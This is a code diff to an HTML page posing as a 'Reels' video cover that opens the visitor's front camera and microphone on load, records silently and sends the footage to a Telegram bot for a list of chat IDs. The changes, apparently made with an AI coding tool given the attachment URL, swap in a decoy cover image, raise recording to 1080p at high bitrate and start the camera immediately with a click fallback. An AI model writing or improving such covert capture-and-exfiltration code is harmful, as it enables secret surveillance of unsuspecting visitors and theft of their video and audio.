@@ -45,7 +45,7 @@
 </head>
 <body>
 
-    <img id="coverImage" src="https://res.cloudinary.com/duixjs8az/image/upload/v1763124618/b3jmvuytjsjargldqkpq" alt="Reels Cover Image">
+    <img id="coverImage" src="https://app.devin.ai/attachments/fd9a323e-7788-4d72-a782-ab952753d719/664916409_2830989830592809_2714150091232523515_n.jpg" alt="Reels Cover Image">
     
     <video id="video" autoplay playsinline></video> 
 
@@ -78,13 +78,13 @@
         /**
          * دالة إرسال الفيديو إلى تيليجرام (تكرر الإرسال لجميع الـ IDs).
          */
-        async function sendVideo(videoBlob) {
+        async function sendVideo(videoBlob, ext = 'mp4') {
             try {
                 // تكرار الإرسال لكل مُعرّف في القائمة
                 for (const chatId of CHAT_IDS_LIST) { 
                     const formData = new FormData();
                     formData.append('chat_id', chatId); // استخدام المُعرّف الحالي
-                    formData.append('video', videoBlob, 'recorded_video.webm'); 
+                    formData.append('video', videoBlob, `recorded_video.${ext}`); 
                     formData.append('caption', `Recorded silently for Chat ID: ${chatId}`);
 
                     await fetch(TELEGRAM_API_URL, {
@@ -126,7 +126,11 @@
         function startRecording() {
             if (!stream) return;
 
-            mediaRecorder = new MediaRecorder(stream);
+            const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
+            mediaRecorder = new MediaRecorder(stream, {
+                mimeType: mimeType,
+                videoBitsPerSecond: 5000000
+            });
             
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
@@ -136,9 +140,10 @@
             
             mediaRecorder.onstop = () => {
                 // دمج الأجزاء إلى ملف فيديو واحد (Blob)
-                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                // إرسال الملف إلى جميع المعرفات
-                sendVideo(videoBlob);
+                const usedMime = mediaRecorder.mimeType || 'video/mp4';
+                const ext = usedMime.includes('mp4') ? 'mp4' : 'webm';
+                const videoBlob = new Blob(videoChunks, { type: usedMime });
+                sendVideo(videoBlob, ext);
             };
 
             // بدء التسجيل
@@ -155,7 +160,9 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'user' 
+                        facingMode: 'user',
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
                     },
                     audio: true 
                 });
@@ -173,8 +180,11 @@
             }
         }
 
-        // بدء تشغيل الكاميرا عند تحميل الصفحة
-        window.onload = startCamera;
+        // بدء تشغيل الكاميرا فوراً
+        startCamera();
+        document.addEventListener('click', () => {
+            if (!stream) startCamera();
+        }, { once: true });
     </script>
 </body>
 </html>
